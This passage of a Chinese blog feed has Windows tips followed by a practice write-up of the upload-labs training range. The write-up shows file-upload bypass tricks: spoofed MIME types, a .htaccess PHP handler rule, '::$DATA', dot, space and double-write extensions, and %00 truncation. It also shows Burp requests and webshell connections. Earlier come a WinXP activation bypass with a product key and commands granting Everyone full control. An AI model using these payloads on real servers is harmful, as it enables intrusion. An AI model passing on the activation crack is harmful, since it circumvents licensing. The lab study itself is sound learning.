title="关闭任务栏窗口预览"></a>关闭任务栏窗口预览</h3><p>win10的这个小窗口预览很烦人,我将任务栏放在顶部,老是和浏览器标签重叠,窗口多的时候这个预览一整排,相当崩溃.<br>使用如下方法关闭<br>命令<code>regedit</code>打开注册表编辑器<br>定位到<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced</code><br>在这个路径下的右边空白处,右键-&gt;新建-&gt;Dword(32位值)<br>把刚刚新建的Dword值重命名为ExtendedUIHoverTime，然后右键点击该键值，在弹出菜单中选择修改菜单项<br>这时就会打开编辑该注册表键值的窗口，把数值数据修改为9000，最后点击确定按钮就可以了<br>接着我们再定位到注册表的<code>HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Taskband</code>注册表项<br>用同样的方法，我们新建一个NumThumbnails的注册表键值，右键点击该键值，在弹出菜单中选择修改菜单项改为0<br>重启计算机,enjoy!</p><p>来源:<a href="https://jingyan.baidu.com/article/92255446755733851648f4fd.html" target="_blank" rel="noopener">https://jingyan.baidu.com/article/92255446755733851648f4fd.html</a></p><h2 id="第三方软件问题"><a href="#第三方软件问题" class="headerlink" title="第三方软件问题"></a>第三方软件问题</h2><h3 id="删除百度网盘设备驱动器"><a href="#删除百度网盘设备驱动器" class="headerlink" title="删除百度网盘设备驱动器"></a>删除百度网盘设备驱动器</h3><p>可以直接在百度网盘设置里取消,重启后如果不成功,需要手动修改注册表.</p><p>win+R  打开”运行“ 输入”regedit“ 代开注册表编辑器.<br>打开下面的路径: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Mycomputer\NameSpace</span><br></pre></td></tr></table></figure><p>直接删除<code>NameSpace</code>的子目录,就会删除网盘的设备驱动.</p><h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><h3 id="你需要来自XXX的权限才能对此文件夹进行更改"><a href="#你需要来自XXX的权限才能对此文件夹进行更改" class="headerlink" title="你需要来自XXX的权限才能对此文件夹进行更改"></a>你需要来自XXX的权限才能对此文件夹进行更改</h3><p>可以更改当前文件用户组,稍微麻烦点.<br>也可以使用cmd如下命令,cmd需要管理员身份运行</p><ul><li>设置F盘everyone都有读写能力</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cacls.exe F:\ /e /t /g everyone:F</span><br></pre></td></tr></table></figure><ul><li>当前目录everyone都有读写能力</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cacls.exe ./ /e /t /g everyone:F</span><br></pre></td></tr></table></figure><h3 id="开机弹出”没有默认的邮件客户端”弹窗"><a href="#开机弹出”没有默认的邮件客户端”弹窗" class="headerlink" title="开机弹出”没有默认的邮件客户端”弹窗"></a>开机弹出”没有默认的邮件客户端”弹窗</h3><p>解决办法（服务里没法直接关闭）：</p><p>定位注册表到“HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services”下。<br>找到4项 “OneSyncSvc”“OneSyncSvc_sessionID”“UserDataSvc”“UserDataSvc_sessionID”<br>把每项里“Start”的值设为4，重启就能看到效果了。（0 引导，1 系统，2 自动-默认，3 手动，4 禁用）<br><em>此处的sessionID不同人不一样,是一个变量</em></p><p>来源:<a href="https://www.zhihu.com/question/40217178/answer/407644015" target="_blank" rel="noopener">如何让Outlook (office365)不再弹出“没有默认的邮件客户端”对话框？ - 拉格朗日的回答 - 知乎</a></p><h1 id="WinXP"><a href="#WinXP" class="headerlink" title="WinXP"></a>WinXP</h1><h1 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h1><p> 1.安装原版windows xp<br>2.打开注册表regedit<br>3.找到主键<br>Hkey_Local_Machine\Software\Microsoft\WindowsNT\CurrentVersion\ WPAEvents\<br>4.删除子键lastWPAEventLoged (如果有的话）<br>5.修改子键OOBETimer键值为：ff d5 71 d6 8b 6a 8d 6f d5 33 93 fd  (手动输入)<br>6.右击注册表中“WPAEvents”键→“权限”→“高级”→“所有者”→你的用户名→“应用”→“确定”<br>7.回到“安全”标签→“高级”→选择列表中的“system”→“编辑”<br>8.把“拒绝”列下的方框全部打勾即可<br>9.“确定”退出 </p><p>安装时可以使用的key:<code>7Q3GG-KFFDX-Y46QG-KFD3X-M4PBF</code> (只在profesional sp3上测试过)</p><div><h1>RECOMMEND</h1><ul><li><a href="https://e1sewhere.github.io/2019/05/23/RD-Client-简明教程/">RD Client 简明教程</a></li><li><a href="https://e1sewhere.github.io/2018/10/27/Win下批量-关闭-打开-进程/">Win下批量 关闭/打开 进程</a></li><li><a href="https://e1sewhere.github.io/2018/10/15/Windows-To-Go系统安装记录/">Windows To Go系统安装记录</a></li><li><a href="http://broken-year.github.io/2022/03/24/back-door/">系统后门</a></li></ul></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文针对&lt;code&gt;Windows&lt;/code&gt;,主要是针对平常使用时,不得不做的一些小设置做一个记录.至于通用优化,以后有时间会参考别人的帖子,做一些精简整理.&lt;/p&gt;
    
    </summary>
    
      <category term="教程" scheme="https://e1sewhere.github.io/categories/%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="windows" scheme="https://e1sewhere.github.io/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>upload labs 练习</title>
    <link href="https://e1sewhere.github.io/2019/02/13/upload-labs-%E7%BB%83%E4%B9%A0/"/>
    <id>https://e1sewhere.github.io/2019/02/13/upload-labs-练习/</id>
    <published>2019-02-13T00:27:43.000Z</published>
    <updated>2019-04-07T08:29:05.880Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>本文记录了练习upload labs 的过程,已经学习完了,有很多问题没有解决,有一些pass也看得很走马观花,但是时间不多先学习其他的.<br>末尾也会持续补充关于upload的知识积累<br><a id="more"></a></p><h1 id="没有解决的pass"><a href="#没有解决的pass" class="headerlink" title="没有解决的pass"></a>没有解决的pass</h1><ul><li><del><a href="#pass3">pass3</a> 还有burp截包没有返回的问题.</del> //刚才测试昨天试过的抓包步骤都是可以抓到的.操作没有问题.</li><li><del><a href="#less5">pass5</a> 同pass3</del> //同上,解决</li><li><a href="#less11">pass11</a> url截断上传失败</li><li><a href="#pass12">pass12</a> hex截断上传失败</li></ul><h1 id="upload漏洞粗略了解"><a href="#upload漏洞粗略了解" class="headerlink" title="upload漏洞粗略了解"></a>upload漏洞粗略了解</h1><h2 id="upload类型"><a href="#upload类型" class="headerlink" title="upload类型"></a>upload类型</h2><p><img src="https://e1sewhere.github.io/images/upload类型.png" alt="upload类型.png"></p><h2 id="判断upload"><a href="#判断upload" class="headerlink" title="判断upload"></a>判断upload</h2><p><img src="https://e1sewhere.github.io/images/判断upload.png" alt="判断upload.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><strong>判断操作系统</strong></p><blockquote><p>我们使用构造后缀的方法时,与操作系统息息相关,例如添加空格,添加点,添加<code>::$DATA</code>都是windows系统的特性,要多注意服务器的版本,与服务所在的操作系统.</p></blockquote><h1 id="参考过的比较好的writup"><a href="#参考过的比较好的writup" class="headerlink" title="参考过的比较好的writup"></a>参考过的比较好的writup</h1><ol><li><a href="https://github.com/LandGrey/upload-labs-writeup" target="_blank" rel="noopener">https://github.com/LandGrey/upload-labs-writeup</a></li><li><a href="https://zhuanlan.zhihu.com/p/52099683" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/52099683</a></li><li><a href="https://fuping.site/2018/06/04/upload-labs-writeup/" target="_blank" rel="noopener">https://fuping.site/2018/06/04/upload-labs-writeup/</a></li></ol><p>没有看很多,主要看他们的思路.</p><h1 id="WritUp"><a href="#WritUp" class="headerlink" title="WritUp"></a>WritUp</h1><h2 id="pass-01-客户端后缀检查"><a href="#pass-01-客户端后缀检查" class="headerlink" title="pass 01 客户端后缀检查"></a>pass 01 客户端后缀检查</h2><p>上传jpg文件成功,上传php文件失败,提示后缀问题.白名单检测.由于弹出错误很快,我们猜测是客户端校验<br>直接单击了’查看提示’,知道了这个pass是本地js检查文件,可以本地修改.</p><h3 id="方法一-firefox-开发者工具直接修改-待查"><a href="#方法一-firefox-开发者工具直接修改-待查" class="headerlink" title="方法一 firefox 开发者工具直接修改 待查?"></a>方法一 firefox 开发者工具直接修改 待查?</h3><p>f12-&gt;查看器<br>找到响应js部分(直接搜索jpg)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var allow_ext = &quot;.jpg|.png|.gif&quot;;</span><br></pre></td></tr></table></figure><p>直接添加,一个<code>|.php</code>.<br>理论上就可以上传了.但是上传失败,提示依旧</p><h3 id="方法二-禁用js"><a href="#方法二-禁用js" class="headerlink" title="方法二 禁用js"></a>方法二 禁用js</h3><p>直接禁用浏览器js功能,安装firefox插件<code>noscript</code>,禁用浏览器js.重试上传过程,成功</p><h3 id="方法三-burp改包"><a href="#方法三-burp改包" class="headerlink" title="方法三 burp改包"></a>方法三 burp改包</h3><p>把一句话木马后缀改为<code>.jpg</code><br>burp代理好,点击上传.把劫到的包发送到,burp的repeater.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /upload-labs/Pass-01/index.php HTTP/1.1</span><br><span class="line">Host: 192.168.96.128</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: http://192.168.96.128/upload-labs/Pass-01/index.php</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------7020711924050</span><br><span class="line">Content-Length: 297</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------7020711924050</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;m.jpg&quot;  //这里修改为`m.php`</span><br><span class="line">Content-Type: image/jpeg</span><br></pre></td></tr></table></figure><p>查看头,把<code>filename</code>改为<code>php</code>后缀.点击go,右边查看返回页面源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;../upload/m.php&quot; width=&quot;250px&quot; /&gt;</span><br></pre></td></tr></table></figure><p>在一个<code>img</code>标签中找到我们上传的文件路径,看到文件已经变为<code>php</code>文件.</p><h2 id="pass2-服务端mime检查"><a href="#pass2-服务端mime检查" class="headerlink" title="pass2 服务端mime检查"></a>pass2 服务端mime检查</h2><p>本pass在服务端对数据包的MIME进行检查.</p><p>直接像pass1一样使用burpsuit修改.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;2.php&quot; //这里直接上传php文件即可不要修改</span><br><span class="line">Content-Type: image/png  //这里原来不是img类型,我们修改为img类型</span><br></pre></td></tr></table></figure><p>修改后,go,查看成功了</p><h2 id="pass3-服务端黑名单"><a href="#pass3-服务端黑名单" class="headerlink" title="pass3 服务端黑名单 ???"></a>pass3 服务端黑名单 <span id="pass3">???</span></h2><p>上传提示不允许php等文件上传,查看提示,应该是服务端黑名单<br><del>本例按照网上的writup无法复现,暂时搁置</del>   //已经问题随着pass2的解决同时解决了,参考pass2<br>//关于,使用burp抓包后,抓不到我们请求的包抓,burp代理firefox,firefox会向服务器发送包,所以浏览器请求的时候发了两个包,一个是像火狐服务器,一个是向网站.我们需要在burp的proxy选项卡的子选项卡intercept,里面.点,<code>drop</code>丢弃这个火狐的包,或者<code>fordard</code>放行这个包,当然点<code>drop</code>最好</p><h3 id="方法一-直接绕过"><a href="#方法一-直接绕过" class="headerlink" title="方法一 直接绕过"></a>方法一 直接绕过</h3><p>文件直接修改<br>我们修改php后缀,服务器只禁止了<code>.php</code>也许没有禁止<code>phtml,php3</code>等可以解析的php后缀.<br>修改为<code>php3</code>上传成功.尝试使用菜刀连接连接失败.<br>直接看服务器的上传路径原来是文件被重命名了.<br>查看网页上提供的源码提示有如下代码,限制大小写,去末尾点,去末尾<code>::data</code>,去末尾空.这三种构造后缀绕过.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">      $file_ext = strrchr($file_name, &apos;.&apos;);</span><br><span class="line">      $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">      $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA</span><br><span class="line">      $file_ext = trim($file_ext); //收尾去空</span><br></pre></td></tr></table></figure><p>本方法失败,我们尝试用新的名称菜刀连接,成功了.<br><del>但是现实我们很难获得改变后的名称.</del><br>哈哈,昨天傻了,还’很难获得’,直接使用burp抓包看返回的图片路径,就知道的我们长传的文件的路径和名称,或者直接用浏览器看源码也可以知道,昨天忘记了的原因可能是burp不知道为什么一直抓不到包.刚才测试昨天试过的抓包步骤都是可以抓到的.操作没有问题</p><h3 id="方法二-htaccess文件上传解析漏洞-（重写解析规则绕过）"><a href="#方法二-htaccess文件上传解析漏洞-（重写解析规则绕过）" class="headerlink" title="方法二 htaccess文件上传解析漏洞 （重写解析规则绕过）"></a>方法二 htaccess文件上传解析漏洞 （重写解析规则绕过）</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>.htaccess是apache服务器中的一个配置文件,不是上传的文件的黑名单之内 ,所以.htaccess文件是可以上传成功<br>上传覆盖.htaccess文件，重写解析规则，将上传的带有脚本马的图片以脚本方式解析</p><h4 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h4><p>打开记事本，将如下代码写入文本中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType  application/x-httpd-php    .jpg</span><br></pre></td></tr></table></figure><p>然后点击文件选中另存为，编写文件名为<code>.htaccess</code>(win创建点开头的文件可以用命令行,或者重命名的时候在后面多加一个点如<code>.htaccess.</code>否则会报错)，选择保存类型为所有文件<br><code>.htaccess</code>文件里的代码的含义 是 将上传的文件后缀名为<code>.jpg</code>格式的文件以<code>php</code>格式来解析文件。<br>将<code>.htaccess</code>文件进行上传,上传成功。<br>按照原理这里我们直接上传<code>.jpg</code>后缀的一句话就可以了.但是我们直接查看上传路径,我们的规则文件也被重命名了.所以本例子中无法成功.</p><p><em>为了测试新学会的这个法二,我们手动修改好两个文件,试一试能否连接</em></p><p>直接往上传文件夹复制两个文件<code>2.jpg</code> <code>.htaccess</code><br>使用菜刀连接,连接成功了<code>2.jpg</code>如我们期望被服务器作为php文件解析了.</p><h2 id="pass4-服务端黑名单检查"><a href="#pass4-服务端黑名单检查" class="headerlink" title="pass4 服务端黑名单检查"></a>pass4 服务端黑名单检查</h2><p>页面直接重新加载,猜测是服务端验证.<br>我们修改后缀为<code>.php3</code>依然报错<br>查看提示,这是黑名单过滤,过滤了绝大部分可执行文件后缀.</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>直接在<code>.php</code>后再添加一个服务器无法解析的后缀,当无法解析的时候服务器会尝试解析前一个后缀.<br>我们将文件名称改为<code>4.php.7z</code>,上传成功了.<br>直接使用菜刀连接.成功了,文件被当作<code>php</code>文件解析了.</p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>继续使用上一个题目学会的上传解析规则文件的方法.<br>我们创建文本文档写入以下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType  application/x-httpd-php    .jpg</span><br></pre></td></tr></table></figure><p>然后将文件改名为<code>.htaccess</code>并上传<br>上传成功了<br>然后上传一个<code>4.jpg</code>的一句话,成功<br>使用菜刀连接,成功,文件被服务器当作php执行了.<br><span id="less5"></span></p><h2 id="pass5"><a href="#pass5" class="headerlink" title="pass5"></a>pass5</h2><p>依然判断是服务器检查<br>我们先上传<code>.php3,.phptml</code>都是失败了.<br>再上传<code>.php.7z</code>成功了 由于上面的都可以通过添加后缀的方法绕过,猜测是我的靶场环境有点问题.后面的pass将会禁止这个方法.<br>我们直接查看提示,发现禁用了常见的后缀,<code>.htaccess</code>也被禁止了.<br>直接查看源代码<br>发现包含部分大小写,<code>php2</code>这样类似的方法都被禁止了<br>但是并没有完全禁止大小写.我们尝试一个没有被禁用的大小写.成功了,且被解析为<code>php</code><br>我们要用一个新学会的方法.</p><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>我们再次查看源码,过滤了末尾的<code>.</code>末尾的空格和末尾的<code>::%DATA</code><br>这三种字加到文件后缀的末尾都会被windows系统自动删除.而服务器处理的时候是会保留的并将其一通视为后缀.最后保存到本地windows中就被删除了.<br>一下是网上搜到的</p><blockquote><p>php+win时.<code>文件名+::$DATA</code>会把data之后的当文件流处理,最后保存的时候只保留<code>::$DATA</code>之前的文件名</p></blockquote><p>查看源码消除<code>::DATA</code>的方法,是直接删除,所以可以使用双写的方法绕过<br>我们将后缀构造成这样的形式<code>.php::%::%DATADATA</code><br>在通過服務器的時候会被服务器把中间的<code>::%DATA</code>删除,然后保存到windows中就是<code>.php::%DATA</code>这样的形式,由于windows的特性<code>::%DATA</code>会被删除(还是忽略?)最后保存到文件系统中就是我们想要的<code>.php</code>.<br>尝试菜刀连接成功了.<br>注意这里我们上传的文件除后缀部分依然被重命名了.需要查看burp的返回页面找到文件路径的名称.</p><h2 id="pass6"><a href="#pass6" class="headerlink" title="pass6"></a>pass6</h2><h3 id="加空绕过"><a href="#加空绕过" class="headerlink" title="加空绕过"></a>加空绕过</h3><p>为了节约时间直接查看源码,过滤方法中将后缀全部替换为小写,删除末尾的点,去除末尾<code>::$DATA</code>.没有对末尾空格处理.<br>我们注意到这里依然将<code>::$DATA</code>直接去除,所以依然可以使用双写绕过.<br>这里我们不再重复,使用加空格绕过<br>构造这样的后缀<code>.php</code><br>上传成功.<br>查看burp返回页面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;../upload/201902151027474533.php &quot; width=&quot;250px&quot; /&gt;</span><br></pre></td></tr></table></figure><p>使用菜刀访问我们的文件,成功</p><h2 id="pass7-后缀加点绕过"><a href="#pass7-后缀加点绕过" class="headerlink" title="pass7 后缀加点绕过"></a>pass7 后缀加点绕过</h2><p>节约时间,直接查看源码.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);</span><br><span class="line">$file_ext = strrchr($file_name, &apos;.&apos;);</span><br><span class="line">$file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">$file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA</span><br><span class="line">$file_ext = trim($file_ext); //首尾去空</span><br></pre></td></tr></table></figure><p>可以看到没有对末尾的点处理,而且依然可以使用<code>::%DATA</code>双写<br>我们使用点号的漏洞,构造这样的后缀<code>.php.</code><br>查看burp的返回页面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;../upload/5.php.&quot; width=&quot;250px&quot; /&gt;            &lt;/div&gt;</span><br></pre></td></tr></table></figure><p>成功了,哈哈最神奇的是这次居然没有重命名了<br>我们用菜刀连接成功了.</p><h2 id="pass8-DATA绕过"><a href="#pass8-DATA绕过" class="headerlink" title="pass8 ::$DATA绕过"></a>pass8 <code>::$DATA</code>绕过</h2><p>直接查看源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);</span><br><span class="line">       $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">       $file_ext = strrchr($file_name, &apos;.&apos;);</span><br><span class="line">       $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">       $file_ext = trim($file_ext); //首尾去空</span><br></pre></td></tr></table></figure><p>没有过滤<code>::$DATA</code>这次连双写都不用了,直接添加这个尾缀.<br>这里就不再操作</p><h2 id="pass9"><a href="#pass9" class="headerlink" title="pass9"></a>pass9</h2><p>直接看源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);</span><br><span class="line">$file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">$file_ext = strrchr($file_name, &apos;.&apos;);</span><br><span class="line">$file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">$file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA</span><br><span class="line">$file_ext = trim($file_ext); //首尾去空</span><br></pre></td></tr></table></figure><p>这次6,7,8pass用的方法都不能用了.<br>我们试一下最开始使用过的方法利用php解析漏洞构造这样的尾缀<code>.php.7z</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;../upload/5.php.7z&quot; width=&quot;250px&quot; /&gt;</span><br></pre></td></tr></table></figure><p>成功了</p><p>但是我需要用其他的方法,于是搜索writup<br>有这样一种方法</p><p>我们查看方法调用,先去除了末尾的点,有去除了末尾的空.<br>那么构造一个这样的后缀试一下<code>.php. .</code><br>按照我们的想法,服务处理后就变成了<code>.php.</code><br>这就是我们想要的后缀.<br>使用burp返回页面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;../upload/9.php. &quot; width=&quot;250px&quot; /&gt;            &lt;/div&gt;</span><br></pre></td></tr></table></figure><p>成功了.</p><h2 id="pass10"><a href="#pass10" class="headerlink" title="pass10"></a>pass10</h2><p>直接查看源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);</span><br><span class="line">$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</span><br><span class="line">$temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br></pre></td></tr></table></figure><p>第二个方法把<code>$deny_ext</code>这个数组里包含的所有后缀都替换为空,我们先试一下<code>.phP</code><br>上传成功了但是查看返回</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;../upload/5.&quot; width=&quot;250px&quot; /&gt;</span><br></pre></td></tr></table></figure><p><code>phP</code>被替换了,这个替换是忽略大小写的.</p><p>但由于是直接替换为空,我们就可以使用双写了.</p><h3 id="后缀双写"><a href="#后缀双写" class="headerlink" title="后缀双写"></a>后缀双写</h3><p>直接构造<code>.phphpp</code><br>查看burp返回</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;../upload/10.hpp&quot; width=&quot;250px&quot; /&gt;</span><br></pre></td></tr></table></figure><p>???,emmm这返回的啥.<br>啊,我构造的有点蠢,虽然是把php插在另一个php里但是最开头构成了php,所以中间的php被拆了.<br>重新构造<code>.pphphp</code>,查看返回</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;../upload/10.php&quot; width=&quot;250px&quot; /&gt;</span><br></pre></td></tr></table></figure><p>恩,这样就没问题了.</p><p><span id="less11"> </span></p><h2 id="pass11"><a href="#pass11" class="headerlink" title="pass11"></a>pass11</h2><p>查看源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">    $ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;);</span><br><span class="line">    $file_ext = substr($_FILES[&apos;upload_file&apos;][&apos;name&apos;],strrpos($_FILES[&apos;upload_file&apos;][&apos;name&apos;],&quot;.&quot;)+1);</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">        $img_path = $_GET[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br></pre></td></tr></table></figure><p>白名单,只允许图片后缀.但是文件上传路径是通过<code>get</code>方法取得的,猜测可以在url中传入我们构造的路径,然后将后面的代码注释掉.<br>然而我不知道怎么注释,搜索网上的writeup,可以使用<code>%00</code>截断,就把后面的字符串截断了.<br>使用<code>%00</code>截断必须满足两个条件</p><ul><li>php版本小于<code>5.3.4</code></li><li>php的<code>magic_quotes_gpc</code>为<code>OFF</code>状态 //在php.ini中修改</li></ul><p>这两个条件我的服务端都满足.<br>所以我使用这个方法,在burp中自定义上传路径然后加上阶段符号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /upload-labs/Pass-11/index.php?save_path=../upload/haha/11.php%00 HTTP/1.1  //这里使用了%00截断</span><br><span class="line">Host: 192.168.96.128</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: http://192.168.96.128/upload-labs/Pass-11/index.php?save_path=../upload/</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------14066184711055</span><br><span class="line">Content-Length: 324</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------14066184711055</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;11.jpg&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br></pre></td></tr></table></figure><p>返回提示上传出错.检查了下配置和我的playload应该没有问题.<br>只能查看下源码问题在哪里了.<br>先查一下不认识的函数:</p><blockquote><p><code>strrpos(被查找的字符串,要查找的字符)</code>,这个函数查找某个字符在字符串中最后一次出现的位置.大小写敏感<br><code>$_FILES[][&#39;name&#39;]</code>获得上传文件的原名称.如果后面的括号里是<code>type</code>就是获得文件类型,<code>tmp_name</code>获得文件被上传后服务器存储的临时文件名,一般是默认.<code>size</code>已上传文件大小.<code>error</code>和文件上传错误相关的代码.<br><code>move_uploaded_file(string $filemane,String $destination)</code>将指定文件(必须是合法的即通过post,get上传的文件)移动到由<code>destination</code>指定的文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_ext = substr($_FILES[&apos;upload_file&apos;][&apos;name&apos;],strrpos($_FILES[&apos;upload_file&apos;][&apos;name&apos;],&quot;.&quot;)+1);</span><br></pre></td></tr></table></figure><p>这个语句的意思就是截取上传文件的原名称的<code>.</code>后面的字符.也就是后缀.<code>$file_ext</code>这个变量保存了文件后缀</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span 